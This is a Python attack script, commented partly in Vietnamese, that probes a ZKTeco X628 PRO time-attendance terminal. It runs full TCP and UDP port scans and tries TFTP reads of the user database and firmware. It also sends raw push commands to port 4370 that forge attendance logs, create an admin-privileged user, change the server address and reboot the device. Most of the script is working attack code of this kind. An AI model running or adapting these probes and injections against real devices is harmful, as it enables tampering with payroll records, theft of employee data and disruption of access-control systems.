# -*- coding: utf-8 -*-
"""
ZK X628 PRO FW 6.60 - DEEP PROBE
Test tất cả attack vectors chưa khai thác:
- Full TCP port scan (1-65535)
- UDP port scan (key ports)
- TFTP, FTP, HTTP on every open port
- Vendor-specific protocols (4371, 4372, 8000, 9000)
- Push event injection
- Firmware extraction endpoints
"""
import sys, os, socket, struct, time, json, re
sys.stdout.reconfigure(encoding='utf-8')

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SCRIPT_DIR)

DEVICE_IP = '172.16.0.214'  # May 3 X628 PRO
OPEN_PORTS_TCP = []
OPEN_PORTS_UDP = []
INTERESTING_RESPONSES = []

def tcp_probe(ip, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def udp_probe(ip, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        # Send empty packet to trigger ICMP unreachable or response
        s.sendto(b'\x00' * 8, (ip, port))
        try:
            data, addr = s.recvfrom(1024)
            s.close()
            return ('RESPONSE', data[:64])
        except socket.timeout:
            s.close()
            return ('NO_RESPONSE', None)
    except Exception as e:
        return ('ERROR', str(e)[:50])

print('=' * 70)
print(f'ZK X628 PRO FW 6.60 DEEP PROBE - {DEVICE_IP}')
print('=' * 70)

# === PHASE 1: Quick scan well-known + ZK-vendor ports ===
print('\n[Phase 1] Quick scan well-known + ZK-vendor ports...')
QUICK_PORTS = [
    # Standard
    21, 22, 23, 25, 53, 69, 80, 110, 123, 135, 139, 143, 161, 389, 443,
    445, 465, 514, 587, 636, 873, 902, 989, 990, 993, 995,
    # ZK vendor
    4370, 4371, 4372, 4373, 9999, 8000, 8080, 8081, 8082, 8083,
    8084, 8085, 8086, 8087, 8088, 8089, 8443, 8888, 9000, 9090,
    # ADMS / Cloud
    6000, 7000, 7001, 7777, 9999, 10000, 12345, 15000, 20000,
    # Misc embedded
    161, 162, 199, 256, 554, 587, 1025, 1026, 1027, 1028,
    1080, 1194, 1433, 1521, 1701, 1723, 1900, 2000, 2049,
    3128, 3306, 3389, 5060, 5222, 5432, 5900, 6379, 8008,
    # High port ranges common in embedded
    37777, 37778, 37779, 38800, 40000, 50000, 60000,
]

for port in QUICK_PORTS:
    if tcp_probe(DEVICE_IP, port, 0.8):
        OPEN_PORTS_TCP.append(port)
        print(f'  TCP/{port} OPEN')

print(f'  → TCP quick scan: {len(OPEN_PORTS_TCP)} open ports: {OPEN_PORTS_TCP}')

# UDP quick probe (key ports)
print('\n[Phase 1b] UDP quick probe on key ports...')
UDP_PORTS = [53, 67, 68, 69, 123, 137, 161, 162, 445, 514, 520, 1024, 1645, 1812, 1900,
             2049, 4370, 5060, 5353, 7777, 8080]

for port in UDP_PORTS:
    status, data = udp_probe(DEVICE_IP, port, 1.0)
    if status == 'RESPONSE':
        OPEN_PORTS_UDP.append(port)
        print(f'  UDP/{port} OPEN (response: {data.hex() if data else "empty"})')

# === PHASE 2: Scan 1-65535 in parallel-ish chunks ===
print('\n[Phase 2] Full TCP scan 1-65535 (chunked)...')
start = time.time()
BATCH = 200
known = {21, 22, 23, 80, 443, 4370, 8080}
for start_port in range(1, 65536, BATCH):
    end_port = min(start_port + BATCH, 65536)
    for port in range(start_port, end_port):
        if port in known or port in OPEN_PORTS_TCP:
            continue
        if tcp_probe(DEVICE_IP, port, 0.3):
            OPEN_PORTS_TCP.append(port)
            print(f'  TCP/{port} OPEN')

elapsed = time.time() - start
print(f'  → Full TCP scan done in {elapsed:.1f}s: {len(OPEN_PORTS_TCP)} open ports')
print(f'  All open TCP: {sorted(OPEN_PORTS_TCP)}')

# === PHASE 3: Probe every open port with HTTP/HTTPS ===
print('\n[Phase 3] HTTP probe on every open port...')
for port in OPEN_PORTS_TCP:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((DEVICE_IP, port))
        s.send(b'GET / HTTP/1.0\r\nHost: ' + DEVICE_IP.encode() + b'\r\nUser-Agent: Mozilla/5.0\r\n\r\n')
        data = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 4096:
                    break
        except socket.timeout:
            pass
        s.close()
        if data and b'<html' in data.lower() or b'<title' in data.lower() or b'HTTP' in data[:50]:
            INTERESTING_RESPONSES.append((port, 'HTTP', data[:200]))
            print(f'  TCP/{port} HTTP RESPONSE: {data[:100]!r}')
        elif data and len(data) > 0:
            INTERESTING_RESPONSES.append((port, 'RAW', data[:200]))
            print(f'  TCP/{port} RAW ({len(data)} bytes): {data[:50]!r}')
    except Exception as e:
        pass

# === PHASE 4: Try TFTP read for firmware ===
print('\n[Phase 4] TFTP firmware read test...')
def tftp_read(ip, filename, mode='octet'):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        # RRQ packet: opcode(2) + filename + 0 + mode + 0
        req = struct.pack('!H', 1) + filename.encode() + b'\x00' + mode.encode() + b'\x00'
        s.sendto(req, (ip, 69))
        data, addr = s.recvfrom(516)
        s.close()
        return data
    except Exception as e:
        return None

for filename in ['zkdb.db', 'firmware.bin', 'config.ini', 'main.bin', 'app.bin', 'data.bin',
                 '/mnt/mtdblock/data/ZKDB.db', 'data/ZKDB.db', 'attlog.dat']:
    result = tftp_read(DEVICE_IP, filename)
    if result:
        print(f'  TFTP {filename}: GOT {len(result)} bytes (opcode={struct.unpack("!H", result[:2])[0]})')

# === PHASE 5: ZK-specific push event injection ===
print('\n[Phase 5] PUSH event injection test...')
print('  (PUSH = device polls server, but trying direct connection variants)')
# Try direct PUSH-style payload to ZK port
for cmd in [
    b'C:1:1 OP LOG 1\tAdmin\t2026-09-14 23:00:00\t0',
    b'C:2:1 DATA UPDATE ATTLOG PIN=1\t2026-09-14 23:00:00\t0\t0\t0\t0\t0',
    b'C:3:1 DATA UPDATE USERINFO PIN=1\tName=Test\tCard=0\tPrivilege=14',
    b'C:4:1 PUT OPTIONS ServerAddr=127.0.0.1',
    b'C:5:1 CONTROL DEVICE REBOOT',
    b'C:6:1 INFO',
    b'C:7:1 RELOAD',
]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((DEVICE_IP, 4370))
        # Send raw ADMS-style command
        s.send(cmd)
        try:
            resp = s.recv(1024)
            print(f'  → Sent: {cmd[:60]!r}')
            print(f'  ← Got:  {resp[:60]!r}')
        except socket.timeout:
            print(f'  → Sent: {cmd[:60]!r} (timeout - no response)')
        s.close()
    except Exception as e:
        print(f'  → {cmd[:40]!r}: ERROR {e}')

# === PHASE 6: ODBC/JDBC probe ===
print('\n[Phase 6] Database protocol probe...')
DB_PORTS = [1433, 1521, 3306, 5432, 6379, 9200, 27017, 50000]
for port in DB_PORTS:
    if tcp_probe(DEVICE_IP, port, 1.0):
        print(f'  DB PORT {port} OPEN!')

# === PHASE 7: Try common ZK vendor SDK endpoints ===
print('\n[Phase 7] ZK vendor SDK HTTP probe...')
SDK_PATHS = [
    '/iclock/cdata', '/iclock/getrequest', '/iclock/devicecmd',
    '/cgi-bin/record', '/cgi-bin/options', '/cgi-bin/firmware',
    '/api/device', '/api/users', '/api/attlog', '/api/options',
    '/cgi-bin/zkip', '/api/zkteco', '/zkteco',
    '/device', '/device/info', '/device/options',
    '/attlog/list', '/attendance/list',
]
for path in SDK_PATHS:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        # Try port 4370 (might multiplex HTTP)
        try:
            s.connect((DEVICE_IP, 4370))
            req = f'GET {path} HTTP/1.0\r\nHost: {DEVICE_IP}\r\n\r\n'.encode()
            s.send(req)
            data = s.recv(2048)
            s.close()
            if data and b'HTTP' in data[:50]:
                print(f'  4370{path}: HTTP! {data[:100]!r}')
        except:
            s.close()
    except:
        pass

# === SUMMARY ===
print('\n' + '=' * 70)
print('SUMMARY')
print('=' * 70)
print(f'Open TCP ports: {sorted(OPEN_PORTS_TCP)}')
print(f'Open UDP ports: {sorted(OPEN_PORTS_UDP)}')
print(f'Interesting responses: {len(INTERESTING_RESPONSES)}')
for port, ptype, data in INTERESTING_RESPONSES:
    print(f'  - {port}/{ptype}: {data[:80]!r}')

# Save full results
result = {
    'device': DEVICE_IP,
    'open_tcp': sorted(OPEN_PORTS_TCP),
    'open_udp': sorted(OPEN_PORTS_UDP),
    'interesting': [(p, t, d.hex() if isinstance(d, bytes) else str(d)) for p, t, d in INTERESTING_RESPONSES],
    'scan_time': time.time()
}
with open('D:\\chamcong\\zk_deep_probe_result.json', 'w') as f:
    json.dump(result, f, indent=2)
print('\nSaved: D:\\chamcong\\zk_deep_probe_result.json')